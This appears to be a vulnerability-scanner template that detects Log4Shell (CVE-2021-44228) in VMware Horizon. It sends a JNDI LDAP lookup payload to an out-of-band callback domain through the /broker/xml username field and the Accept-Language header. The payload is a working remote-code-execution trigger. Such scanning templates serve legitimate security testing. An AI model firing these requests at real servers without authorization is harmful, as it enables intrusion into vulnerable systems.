name: VMware_Horizon_log4j2_RCE__CVE_2021_44228
transport: http
detail:
  dock: body="VMware Horizon"
  product: VMware
  homepage: https://www.vmware.com
  impact: <p>Attackers can use the vulnerability CVE-2021-44228 to cause remote code
    execution and control server permissions.</p>
  description: <p>Various VMware products such as VMware Horizon, VMware vCenter Server,
    VMware HCX, VMware NSX-T Data Center, etc. are affected by the remote code execution
    vulnerability CVE-2021-44228.</p><p>Attackers can use the vulnerability CVE-2021-44228
    to cause remote code execution and control server permissions.</p>
set:
  reverse: newReverse()
  payload: '${jndi:ldap://' + reverse.domain + '}'
rules:
  r1:
    method: POST
    url: /broker/xml
    headers:
      Content-Type: application/x-www-form-urlencoded
    data: <?xml version='1.0' encoding='UTF-8'?><broker version='14.0'><do-submit-authentication><screen><name>securid-passcode</name><params><param><name>username</name><values><value>{{payload}}</value></values></param><param><name>passcode</name><values><value>12321</value></values></param></params></screen></do-submit-authentication></broker>
    expression: reverse.wait(2)
  r2:
    method: GET
    url: /portal/webclient/index.html
    headers:
      Accept-Language: "{{payload}}"
    expression: reverse.wait(5)
expression: r1() || r2()
